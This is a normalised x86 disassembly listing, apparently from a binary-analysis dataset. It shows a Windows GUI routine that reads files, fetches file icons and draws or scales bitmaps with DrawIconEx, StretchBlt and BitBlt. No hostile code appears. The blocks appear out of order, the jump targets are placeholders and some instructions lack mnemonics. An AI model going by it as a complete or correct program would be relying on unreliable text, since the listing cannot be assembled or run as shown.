mov ecx [ esp + 0x474 ]
push edx
push eax
call sub_43e840
jmp r-xdata
lea edx [ esp + 0x10c ]
push edx
lea eax [ esp + 0x138 ]
push eax
lea ecx [ esp + 0x11c ]
push ecx
lea edx [ esp + 0xd10 ]
push edx
lea eax [ esp + 0x13c ]
push eax
push 0x3f800000
push edi
push ebx
call sub_405d40
add esp 0x20
cmp eax 0x1
jne r-xdata
xor edi edi
mov ecx [ rw-data ]
mov ebx [ ebx + ecx + 0x20 ]
mov eax [ rw-data ]
cmp ebx eax
ja r-xdata
cmp [ esp + 0xac ] 0x10
mov [ esp + 0x1dac ] 0x1
jb r-xdata
mov eax [ eax + 0x44 ]
push 0x1
lea ebx [ esp + 0x10c ]
push ebx
lea ebx [ esp + 0x140 ]
push ebx
lea ebx [ esp + 0x14c ]
push ebx
lea ebx [ esp + 0x134 ]
push ebx
lea ebx [ esp + 0x1568 ]
push ebx
lea ebx [ esp + 0x140 ]
push ebx
push eax
push edx
push edx
push ecx
call sub_406950
add esp 0x2c
test eax eax
jl r-xdata
mov ecx rw-data
mov eax [ eax + 0x44 ]
lea edx [ esp + 0x130 ]
push edx
lea edx [ esp + 0x11c ]
push edx
lea edx [ esp + 0x128 ]
push edx
lea edx [ esp + 0x1138 ]
push edx
lea edx [ esp + 0x10c ]
push edx
mov edx [ rw-data ]
push edx
push eax
push ecx
call sub_405d40
add esp 0x20
cmp eax 0x1
jne r-xdata
mov ecx rw-data
jne r-xdata
push edi
call [ CloseHandle@IAT ]
mov ebx [ esp + 0x10 ]
jmp r-xdata
push 0x0
lea ecx [ esp + 0x188 ]
push ecx
push ebx
push eax
push edi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
call sub_40af00
mov edi [ esp + 0x38 ]
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx edi
call sub_4440b0
mov esi eax
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx edi
push edx
call sub_444100
xor ebx ebx
cmp esi ebx
mov ecx eax
jle r-xdata
cmp [ esp + 0xac ] 0x10
mov [ esp + 0x1dac ] 0x1
jb r-xdata
mov ecx rw-data
call sub_401420
mov esi [ esp + 0x70 ]
mov edi [ esp + 0x58 ]
mov ecx [ esp + 0x34 ]
push 0x1
lea eax [ esp + 0x68 ]
push eax
add esi edi
push ecx
mov [ esp + 0x7c ] esi
call sub_45d710
add esp 0xc
sub esi edi
jmp r-xdata
mov eax edx
test eax eax
jle r-xdata
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
mov ecx edi
mov edi eax
xor eax eax
[ esi ] [ edi ]
je r-xdata
test eax eax
jle r-xdata
mov eax [ rw-data ]
fild [ rw-data ]
mov ecx [ esp + 0x28 ]
lea edx [ eax + ecx ]
imul edx [ esp + 0x3c ]
fmul [ rw-data ]
lea ebp [ edx + eax + 0x2 ]
mov eax [ rw-data ]
lea eax [ eax + eax * 2 ]
push ecx
lea ebx [ ebp + eax * 4 ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
mov edx [ esp + 0x34 ]
mov esi [ esp + 0x78 ]
add ecx edx
imul ecx [ esp + 0x88 ]
mov [ esp + 0x14 ] ecx
sub esi eax
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
add esi eax
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edi [ esp + 0x80 ]
mov ecx [ esp + 0x2c ]
sub edi eax
mov eax [ rw-data ]
add eax ecx
imul eax [ esp + 0x4c ]
mov [ esp + 0x14 ] eax
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edx [ esp + 0xb4 ]
mov ecx [ esp + 0x64 ]
add edi eax
lea eax [ esi + edx ]
mov edx [ esp + 0x90 ]
add esp 0x4
add ecx edi
cmp esi edx
jge r-xdata
mov ebx [ esp + 0x5c ]
push 0x110
push 0x160
lea eax [ esp + 0x568 ]
push eax
push ebx
call [ GetFileAttributesA@IAT ]
push eax
push ebx
call [ SHGetFileInfoA@IAT ]
mov ecx [ esp + 0x560 ]
mov edx [ esp + 0x1c ]
push 0x3
push edi
push edi
push 0xe
push 0xe
push ecx
mov ecx [ rw-data ]
add edx 0xfffffffe
push edx
lea eax [ esi - 0x11 ]
push eax
push ecx
call [ DrawIconEx@IAT ]
mov edx [ esp + 0x560 ]
push edx
call [ DestroyIcon@IAT ]
mov eax ecx
sub eax ebp
cdq
sub eax edx
mov ebx eax
mov eax esi
sub eax ebp
cdq
sub eax edx
sar ebx 0x1
sar eax 0x1
mov [ esp + 0x20 ] eax
mov ebp ecx
mov [ esp + 0x2c ] ebp
mov eax esi
sub eax ebp
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x20 ] eax
mov eax ecx
sub eax ebp
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
jmp r-xdata
mov ebp esi
mov [ esp + 0x2c ] ebp
call sub_40af00
mov esi [ esp + 0x38 ]
push eax
push 0x0
mov ecx esi
call sub_444100
mov ebx eax
mov [ esp + 0x40 ] ebx
call sub_40af00
push eax
push 0x0
mov ecx esi
call sub_4440b0
mov [ esp + 0x2c ] eax
mov edi eax
mov eax [ ebp + 0x324 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov ecx [ esp + 0x10c ]
mov edx [ esp + 0x134 ]
mov eax [ esp + 0x114 ]
push 0x0
push ecx
push edx
movzx edx [ esp + 0xd1e ]
push eax
mov eax [ esp + 0x2c ]
sub esp 0x428
mov edi esp
mov ecx 0x10a
lea esi [ esp + 0x113c ]
[ edi ] [ esi ]
mov ecx [ esp + 0x564 ]
push ecx
mov ecx [ esp + 0x474 ]
or edx 0x10000000
push edx
push eax
call sub_43e840
jmp r-xdata
mov [ esp + 0xe0 ] 0x1
mov edi [ rw-data ]
add edi ebx
cmp edi eax
mov [ esp + 0xe0 ] 0x0
mov [ rw-data ] edi
jbe r-xdata
mov [ esp + 0xac ] edi
mov [ esp + 0xa8 ] 0x0
mov [ esp + 0x98 ] 0x0
jmp r-xdata
mov eax [ esp + 0x98 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0xac ] esi
mov [ esp + 0x1dac ] 0x1
jb r-xdata
mov ecx [ esp + 0x138 ]
mov edx [ esp + 0x140 ]
mov eax [ esp + 0x124 ]
push 0x0
push ecx
push edx
mov edx [ esp + 0x114 ]
push eax
sub esp 0x428
mov edi esp
mov ecx 0x10a
lea esi [ esp + 0x198c ]
[ edi ] [ esi ]
mov ecx [ esp + 0x560 ]
push ecx
jmp r-xdata
mov ecx [ esp + 0x130 ]
mov edx [ esp + 0x118 ]
mov eax [ esp + 0x120 ]
push 0x0
push ecx
push edx
movzx edx [ esp + 0x1146 ]
push eax
sub esp 0x428
mov edi esp
mov ecx 0x10a
lea esi [ esp + 0x1564 ]
[ edi ] [ esi ]
mov ecx [ esp + 0x534 ]
push ecx
or edx 0x10000000
mov ecx [ esp + 0x88 ]
push ecx
call [ LocalFree@IAT ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov esi [ esp + 0x14 ]
push 0x0
push edx
mov edx [ rw-data ]
test edx edx
mov edx [ esp + 0x90 ]
setne al
shl ecx 0x10
or ecx esi
push eax
mov eax [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x48 ]
push 0x0
push ebp
push edx
push eax
call sub_4402e0
mov esi eax
cmp [ esp + 0xac ] 0x10
mov [ esp + 0x1dac ] 0x1
jb r-xdata
cmp ecx ebx
jle r-xdata
mov [ esp + 0xac ] 0xf
mov [ esp + 0xa8 ] 0x0
mov [ esp + 0x98 ] 0x0
jmp r-xdata
mov eax [ esp + 0x98 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
fld [ rw-data ]
push 0xcc0020
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpe r-xdata
test ecx ecx
jle r-xdata
mov eax [ esp + 0x1c ]
cmp [ rw-data ] eax
jne r-xdata
cmp edi [ esp + 0x90 ]
jge r-xdata
mov ecx rw-data
mov [ esp + 0x14 ] ebx
call sub_404310
mov edx [ rw-data ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x6c0 ]
mov edi [ esp + 0x30 ]
push 0x3
push 0x0
push 0x0
push ebp
push ebp
push ecx
mov ecx [ rw-data ]
add edx eax
imul edx [ esp + 0x54 ]
add ecx edi
imul ecx [ esp + 0x5c ]
add edx ebx
push edx
add ecx [ esp + 0x3c ]
mov edx [ rw-data ]
push ecx
push edx
call [ DrawIconEx@IAT ]
mov eax [ esp + 0x6c0 ]
push eax
call [ DestroyIcon@IAT ]
fild [ rw-data ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
mov esi [ esp + 0x78 ]
add ecx edi
imul ecx [ esp + 0x88 ]
mov [ esp + 0x14 ] ecx
sub esi eax
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
add esi eax
mov [ esp + 0x68 ] esi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edi [ esp + 0x80 ]
mov edx [ rw-data ]
sub edi eax
mov eax [ esp + 0x2c ]
add edx eax
imul edx [ esp + 0x4c ]
mov [ esp + 0x14 ] edx
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0xb4 ]
mov edx [ esp + 0x64 ]
add edi eax
lea eax [ esi + ecx ]
lea ecx [ edi + edx ]
mov [ esp + 0x74 ] ecx
mov ecx [ esp + 0x90 ]
add esp 0x4
cmp esi ecx
mov [ esp + 0x68 ] edi
mov [ esp + 0x6c ] eax
jge r-xdata
mov ecx [ rw-data ]
mov esi [ rw-data ]
imul ebx ecx
mov eax edi
imul eax esi
cmp eax ebx
jle r-xdata
mov eax [ ebp + 0x328 ]
mov esi 0x10
cmp eax esi
jb r-xdata
mov ecx [ esp + 0x80 ]
mov edx [ rw-data ]
mov eax [ esp + 0x1c ]
mov [ edx + eax * 4 ] ecx
lea ecx [ esp + 0x1c ]
push ecx
mov ecx rw-data
call sub_46a5f0
jmp r-xdata
mov ebp [ rw-data ]
mov esi [ rw-data ]
mov ecx [ esp + 0x98 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0xac ] edi
mov [ esp + 0xa8 ] 0x0
mov [ esp + 0x98 ] 0x0
jmp r-xdata
mov eax [ esp + 0x458 ]
mov ecx [ esp + 0x474 ]
push edx
push eax
call sub_43e840
mov [ esp + 0xac ] 0xf
mov [ esp + 0xa8 ] ebx
mov [ esp + 0x98 ] 0x0
jmp r-xdata
mov edx [ esp + 0x98 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov edi [ rw-data ]
mov eax [ rw-data ]
mov edx ecx
mov ebp esi
imul edx edi
imul ebp eax
cmp ebp edx
jle r-xdata
mov ecx [ rw-data ]
fild [ esp + 0x1c ]
mov edx [ esp + 0x2c ]
mov eax [ rw-data ]
add ecx edx
fmul [ rw-data ]
imul ecx [ esp + 0x40 ]
mov edx [ rw-data ]
push ebp
push ebx
add ecx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x40 ]
add eax ecx
imul eax [ esp + 0x54 ]
add eax [ esp + 0x30 ]
push eax
push edx
push ecx
fstp [ esp ]
call sub_452500
fild [ esp + 0x5c ]
add esp 0x4
push eax
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x34 ]
add esp 0x4
push eax
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x44 ]
add esp 0x4
add eax edi
push eax
fmul [ rw-data ]
push ecx
fstp [ esp ]
call sub_452500
add esp 0x4
add eax esi
push eax
mov eax [ esp + 0x5c ]
push eax
call [ StretchBlt@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x2c ]
lea edx [ eax + ecx ]
imul edx [ esp + 0x40 ]
mov eax [ esp + 0x18 ]
mov ecx [ rw-data ]
add edx eax
push edx
mov edx [ esp + 0x38 ]
add edx ecx
imul edx [ esp + 0x4c ]
mov ecx [ esp + 0x28 ]
add edx ecx
push edx
mov edx [ rw-data ]
push edx
push ebp
push ebx
add edi eax
mov eax [ esp + 0x4c ]
push edi
add esi ecx
push esi
push eax
call [ BitBlt@IAT ]
jmp r-xdata
fld [ rw-data ]
push 0xcc0020
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpe r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov ecx [ esp + 0x34 ]
push 0x0
lea eax [ esp + 0x68 ]
push eax
push ecx
jmp r-xdata
test eax eax
jle r-xdata
mov ebp esi
mov eax ebp
imul eax edi
cdq
idiv [ esp + 0x40 ]
mov esi [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x78 ] ebp
mov ebx eax
mov eax [ esi + 0x324 ]
sub ecx ebx
test eax eax
mov [ esp + 0x10 ] ebx
mov edi ecx
je r-xdata
mov ebx ecx
mov eax ebx
imul eax [ esp + 0x40 ]
cdq
idiv edi
mov edi [ esp + 0x18 ]
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] ebx
mov ebp eax
mov eax [ edi + 0x324 ]
sub esi ebp
test eax eax
mov [ esp + 0x78 ] ebp
je r-xdata
lea eax [ ebp + 0x314 ]
mov eax [ ebp + 0x314 ]
jmp r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push edx
mov edx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x80 ]
push 0x0
shl ecx 0x10
or ecx edx
mov edx [ esp + 0xec ]
push ecx
mov ecx [ esp + 0x90 ]
push edx
mov edx [ esp + 0x30 ]
push eax
push ecx
push edx
mov ebx [ rw-data ]
mov ecx [ ebx + ecx * 4 ]
mov ecx [ ecx + edx * 4 ]
mov edx [ rw-data ]
imul ecx ecx 0x70
add ecx edx
sub edi [ ecx + 0x20 ]
lea edx [ eax * 4 ]
sub esi edx
cmp ebp eax
mov [ rw-data ] edi
ja r-xdata
sub ecx ebp
mov [ esp + 0x14 ] ebx
mov ebx eax
mov eax esi
imul eax ebx
cdq
idiv ecx
mov ebp eax
mov eax edi
sub eax ebp
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x20 ] eax
mov ebp edi
mov eax ecx
imul eax ebp
cdq
idiv esi
mov [ esp + 0x20 ] ebx
mov ebx eax
mov eax [ rw-data ]
sub eax ebx
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x14 ] eax
jmp r-xdata
mov edx [ esp + 0x5c ]
fild [ esp + 0x5c ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
push edx
fmul [ rw-data ]
mov edx [ esp + 0x30 ]
add edx ecx
imul edx [ esp + 0x44 ]
push eax
lea ecx [ edx + ecx + 0x2 ]
mov edx [ esp + 0x3c ]
add eax edx
imul eax [ esp + 0x50 ]
push ecx
push eax
mov eax [ rw-data ]
push eax
push ecx
fstp [ esp ]
call sub_452500
fild [ rw-data ]
add esp 0x4
push eax
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
add ecx 0x2
mov [ esp + 0x30 ] ecx
fild [ esp + 0x30 ]
add esp 0x4
push eax
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edx [ esp + 0x58 ]
add esp 0x4
add eax edi
push eax
push esi
push edx
call [ StretchBlt@IAT ]
mov eax [ rw-data ]
mov edx [ esp + 0x2c ]
lea ecx [ eax + edx ]
imul ecx [ esp + 0x40 ]
lea edx [ ecx + eax + 0x2 ]
mov ecx [ rw-data ]
push edx
mov edx [ esp + 0x38 ]
add edx ecx
imul edx [ esp + 0x4c ]
add edx 0x2
push edx
mov edx [ rw-data ]
push edx
sub ebx ebp
push ebx
add ecx 0xfffffffc
push ecx
mov ecx [ esp + 0x4c ]
lea eax [ edi + eax + 0x2 ]
push eax
add esi 0x2
push esi
push ecx
call [ BitBlt@IAT ]
jmp r-xdata
cmp [ esp + 0x1f4 ] 0x10
jb r-xdata
mov eax [ esp + 0x34 ]
push 0x1
lea edx [ esp + 0x68 ]
push edx
push eax
mov esi [ esp + 0x7c ]
mov edi [ esp + 0x64 ]
add esi edi
mov [ esp + 0x7c ] esi
call sub_45d710
add esp 0xc
sub esi edi
mov eax [ esp + 0x70 ]
test eax eax
jle r-xdata
mov eax edi
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x20 ] eax
cmp [ esi + 0x328 ] 0x10
jb r-xdata
mov eax esi
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x14 ] eax
jmp r-xdata
cmp [ edi + 0x328 ] 0x10
jb r-xdata
mov eax [ ebp + 0x324 ]
test eax eax
jne r-xdata
push eax
call j_sub_4b692d
add esp 0x4
test eax eax
jle r-xdata
mov eax [ ebx + eax * 4 ]
mov eax [ eax + esi * 4 ]
mov ecx [ rw-data ]
mov edx [ ecx + eax * 4 ]
push edx
call [ LocalFree@IAT ]
mov ecx [ rw-data ]
mov eax ecx
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax * 4 ]
sub ecx edx
mov edx [ rw-data ]
cmp edx eax
ja r-xdata
sub eax ebp
mov esi [ esp + 0x34 ]
cmp edi [ esp + 0x90 ]
jge r-xdata
mov ecx rw-data
mov [ esp + 0x18 ] ebx
mov [ esp + 0x40 ] ebp
call sub_404310
mov esi [ rw-data ]
push 0x0
push 0x0
push 0x0
call sub_40af00
mov edx [ rw-data ]
push eax
mov ecx [ esp + 0x5c ]
mov edi [ esp + 0x24 ]
xor eax eax
mov al [ rw-data ]
push eax
mov eax [ esp + 0x3c ]
add edx eax
imul edx [ esp + 0x50 ]
mov eax [ esp + 0x34 ]
push ecx
mov ecx [ rw-data ]
push ebx
add edx edi
mov edi [ esp + 0x4c ]
push ebp
add ecx edi
imul ecx [ esp + 0x64 ]
push 0x0
push 0x0
push ebx
push ebp
push edx
add ecx eax
push ecx
mov ecx [ esp + 0x70 ]
push esi
call sub_4421e0
push ecx
fild [ rw-data ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edx [ rw-data ]
mov esi [ esp + 0x78 ]
add edx edi
imul edx [ esp + 0x88 ]
mov [ esp + 0x14 ] edx
sub esi eax
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
add esi eax
mov [ esp + 0x68 ] esi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edi [ esp + 0x80 ]
mov ecx [ esp + 0x2c ]
sub edi eax
mov eax [ rw-data ]
add eax ecx
imul eax [ esp + 0x4c ]
mov [ esp + 0x14 ] eax
fild [ esp + 0x14 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edx [ esp + 0xb4 ]
mov ecx [ esp + 0x64 ]
add edi eax
lea eax [ esi + edx ]
lea edx [ edi + ecx ]
mov ecx [ esp + 0x90 ]
add esp 0x4
mov [ esp + 0x68 ] edi
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] edx
cmp esi ecx
jge r-xdata
cmp [ esp + 0x1a0 ] 0x10
mov [ esp + 0x1f4 ] 0xf
mov [ esp + 0x1f0 ] 0x0
mov [ esp + 0x1e0 ] 0x0
jb r-xdata
mov ecx [ esp + 0x1e0 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
fld [ rw-data ]
push 0xcc0020
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpe r-xdata
mov eax [ esp + 0x1c ]
cmp [ rw-data ] eax
jne r-xdata
cmp edi [ esp + 0x90 ]
jge r-xdata
lea eax [ esi + 0x314 ]
mov eax [ esi + 0x314 ]
jmp r-xdata
xor edi edi
mov [ esp + 0x18 ] ebx
lea eax [ edi + 0x314 ]
mov eax [ edi + 0x314 ]
jmp r-xdata
cmp [ ebp + 0x328 ] esi
jb r-xdata
or edi 0xffffffff
jmp r-xdata
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
mov ecx [ eax + ecx * 4 ]
mov edx [ rw-data ]
mov [ edx + ecx * 4 ] 0x0
mov eax [ rw-data ]
test eax eax
mov ebp [ rw-data ]
mov esi [ rw-data ]
je r-xdata
sub eax edx
cmp [ rw-data ] eax
jne r-xdata
push 0x0
lea edx [ esp + 0x68 ]
push edx
jmp r-xdata
test eax eax
jle r-xdata
mov [ esp + 0x1a0 ] 0xf
mov [ esp + 0x19c ] 0x0
mov [ esp + 0x18c ] 0x0
mov edx [ esp + 0x18c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
fild [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
mov edx [ rw-data ]
add eax ecx
fstp [ esp + 0x14 ]
imul eax [ esp + 0x40 ]
fld [ esp + 0x14 ]
fmul [ rw-data ]
mov ecx [ rw-data ]
push ebp
push ebp
mov ebp [ esp + 0x2c ]
add eax ebx
push eax
mov eax [ esp + 0x40 ]
add edx eax
imul edx [ esp + 0x54 ]
add edx ebp
push edx
push ecx
push ecx
fstp [ esp ]
call sub_452500
fld [ esp + 0x2c ]
add esp 0x4
fmul [ rw-data ]
push eax
push ecx
fstp [ esp ]
call sub_452500
fild [ esp + 0x34 ]
add esp 0x4
push eax
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x44 ]
add esp 0x4
add eax edi
push eax
fmul [ rw-data ]
push ecx
fstp [ esp ]
call sub_452500
mov edx [ esp + 0x5c ]
add esp 0x4
add eax esi
push eax
push edx
call [ StretchBlt@IAT ]
mov edx [ rw-data ]
mov eax [ esp + 0x2c ]
mov ecx [ rw-data ]
add edx eax
imul edx [ esp + 0x40 ]
mov eax [ esp + 0x24 ]
add edx ebx
push edx
mov edx [ esp + 0x38 ]
add ecx edx
imul ecx [ esp + 0x4c ]
mov edx [ esp + 0x3c ]
add ecx eax
push ecx
mov ecx [ rw-data ]
push ecx
push ebp
push ebp
add edi ebx
push edi
add esi eax
push esi
push edx
call [ BitBlt@IAT ]
jmp r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov edx [ esp + 0x34 ]
push 0x0
lea ecx [ esp + 0x68 ]
push ecx
push edx
jmp r-xdata
test eax eax
jle r-xdata
mov eax edi
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x20 ] eax
mov eax ebp
imul eax [ esp + 0x2c ]
cdq
idiv [ esp + 0x40 ]
cmp eax ebx
mov [ esp + 0x18 ] eax
jge r-xdata
push eax
call j_sub_4b692d
add esp 0x4
test eax eax
jle r-xdata
mov eax esi
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x14 ] eax
mov eax ebp
imul eax [ esp + 0x2c ]
cdq
idiv [ esp + 0x40 ]
cmp eax ebx
mov [ esp + 0x18 ] eax
jge r-xdata
push eax
call j_sub_4b692d
add esp 0x4
test eax eax
jle r-xdata
add ebp 0x314
mov ebp [ ebp + 0x314 ]
jmp r-xdata
mov edi [ rw-data ]
cmp edi [ rw-data ]
ja r-xdata
inc esi
lea eax [ ebp * 4 ]
cmp eax esi
mov [ rw-data ] esi
ja r-xdata
cmp [ esp + 0xac ] 0x10
mov [ esp + 0x1dac ] 0x1
jb r-xdata
push 0x1
lea eax [ esp + 0x68 ]
push eax
mov edi [ esp + 0x78 ]
mov ebx [ esp + 0x60 ]
add edi ebx
push esi
mov [ esp + 0x7c ] edi
call sub_45d710
add esp 0xc
sub edi ebx
mov eax edx
test eax eax
jle r-xdata
mov ecx [ esp + 0x34 ]
push 0x1
lea eax [ esp + 0x68 ]
push eax
push ecx
jmp r-xdata
mov eax edx
test eax eax
jle r-xdata
mov eax [ esi + 0x308 ]
test eax eax
jne r-xdata
mov [ esp + 0x18 ] ebx
mov eax [ edi + 0x308 ]
test eax eax
jne r-xdata
mov [ esp + 0x18 ] ebx
push ebp
call j_sub_4b692d
add esp 0x4
mov edi eax
mov eax esi
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
lea edx [ ecx * 4 ]
mov ebx edx
mov edx esi
sub edx ebx
cmp ebp ecx
ja r-xdata
dec [ rw-data ]
jne r-xdata
xor esi esi
mov [ rw-data ] esi
mov [ esp + 0xac ] 0xf
mov [ esp + 0xa8 ] 0x0
mov [ esp + 0x98 ] 0x0
jmp r-xdata
mov ecx [ esp + 0x98 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
fld [ rw-data ]
mov ecx [ esp + 0x28 ]
fcomp [ r--data ]
push 0xcc0020
fnstsw ax
test ah 0x44
mov eax [ rw-data ]
jpe r-xdata
fld [ rw-data ]
push 0xcc0020
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpe r-xdata
cmp [ esi + 0x30c ] 0x10
jb r-xdata
or edi 0xffffffff
jmp r-xdata
cmp [ edi + 0x30c ] 0x10
jb r-xdata
or esi 0xffffffff
jmp r-xdata
xor esi esi
mov [ rw-data ] esi
mov edx [ esp + 0x18 ]
fild [ esp + 0x1c ]
add eax ecx
imul eax [ esp + 0x40 ]
fmul [ rw-data ]
mov ecx [ rw-data ]
push ebx
add eax edx
mov edx [ rw-data ]
push ebp
mov ebp [ esp + 0x2c ]
push eax
mov eax [ esp + 0x40 ]
add edx eax
imul edx [ esp + 0x54 ]
add edx ebp
push edx
push ecx
push ecx
fstp [ esp ]
call sub_452500
fild [ esp + 0x5c ]
add esp 0x4
push eax
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x34 ]
add esp 0x4
push eax
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x44 ]
add esp 0x4
add eax edi
push eax
fmul [ rw-data ]
push ecx
fstp [ esp ]
call sub_452500
add esp 0x4
add eax esi
mov esi [ esp + 0x58 ]
push eax
push esi
call [ StretchBlt@IAT ]
jmp r-xdata
lea edx [ eax + ecx ]
imul edx [ esp + 0x40 ]
mov eax [ esp + 0x18 ]
mov ecx [ rw-data ]
add edx eax
push edx
mov edx [ esp + 0x38 ]
add edx ecx
imul edx [ esp + 0x4c ]
mov ecx [ esp + 0x28 ]
add edx ecx
push edx
mov edx [ rw-data ]
push edx
push ebx
push ebp
add edi eax
push edi
add esi ecx
push esi
mov esi [ esp + 0x54 ]
push esi
call [ BitBlt@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
fild [ esp + 0x7c ]
mov edx [ esp + 0x2c ]
mov eax [ rw-data ]
add ecx edx
fmul [ rw-data ]
imul ecx [ esp + 0x40 ]
mov edx [ rw-data ]
push ebp
push ebx
add ecx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x40 ]
add eax ecx
imul eax [ esp + 0x54 ]
add eax [ esp + 0x30 ]
push eax
push edx
push ecx
fstp [ esp ]
call sub_452500
fild [ esp + 0x2c ]
add esp 0x4
push eax
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x34 ]
add esp 0x4
push eax
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x44 ]
add esp 0x4
add eax edi
push eax
fmul [ rw-data ]
push ecx
fstp [ esp ]
call sub_452500
add esp 0x4
add eax esi
push eax
mov eax [ esp + 0x5c ]
push eax
call [ StretchBlt@IAT ]
mov eax [ rw-data ]
mov ecx [ esp + 0x2c ]
mov edx [ rw-data ]
add eax ecx
imul eax [ esp + 0x40 ]
mov ecx [ esp + 0x18 ]
add eax ecx
push eax
mov eax [ esp + 0x38 ]
add edx eax
imul edx [ esp + 0x4c ]
mov eax [ esp + 0x28 ]
add edx eax
push edx
mov edx [ rw-data ]
push edx
push ebp
push ebx
add edi ecx
push edi
add esi eax
mov eax [ esp + 0x50 ]
push esi
push eax
call [ BitBlt@IAT ]
jmp r-xdata
lea eax [ esi + 0x2f8 ]
mov eax [ esi + 0x2f8 ]
jmp r-xdata
mov eax [ esi + 0x324 ]
test eax eax
jne r-xdata
lea eax [ edi + 0x2f8 ]
mov eax [ edi + 0x2f8 ]
jmp r-xdata
mov eax [ edi + 0x324 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
cmp [ rw-data ] eax
jne r-xdata
cmp [ esi + 0x328 ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov edi eax
cmp [ edi + 0x328 ] 0x10
jb r-xdata
or eax 0xffffffff
jmp r-xdata
push eax
call j_sub_4b692d
add esp 0x4
mov esi eax
add esi 0x314
mov esi [ esi + 0x314 ]
jmp r-xdata
fild [ esp + 0x18 ]
sub edi eax
push ecx
fidiv [ esp + 0x30 ]
mov [ esp + 0x30 ] edi
fimul [ esp + 0x30 ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov edi eax
jmp r-xdata
add edi 0x314
mov edi [ edi + 0x314 ]
jmp r-xdata
fild [ esp + 0x18 ]
sub esi eax
push ecx
fidiv [ esp + 0x30 ]
mov [ esp + 0x30 ] esi
fimul [ esp + 0x30 ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov edi eax
jmp r-xdata
mov ecx rw-data
call sub_404310
mov esi [ rw-data ]
push 0x0
push 0x0
push 0x0
call sub_40af00
mov ecx [ esp + 0x58 ]
mov edx [ esp + 0x24 ]
push eax
mov eax [ rw-data ]
push 0x0
push ecx
mov ecx [ esp + 0x40 ]
add eax ecx
imul eax [ esp + 0x54 ]
push ebp
push edx
mov edx [ esp + 0x34 ]
mov ecx [ esp + 0x58 ]
push 0x0
push edi
mov edi [ esp + 0x58 ]
add eax edx
mov edx [ rw-data ]
add edx edi
imul edx [ esp + 0x6c ]
push ebp
push ebx
push eax
add edx [ esp + 0x54 ]
push edx
push esi
call sub_4421e0
push ecx
fild [ rw-data ]
fmul [ rw-data ]
fstp [ esp ]
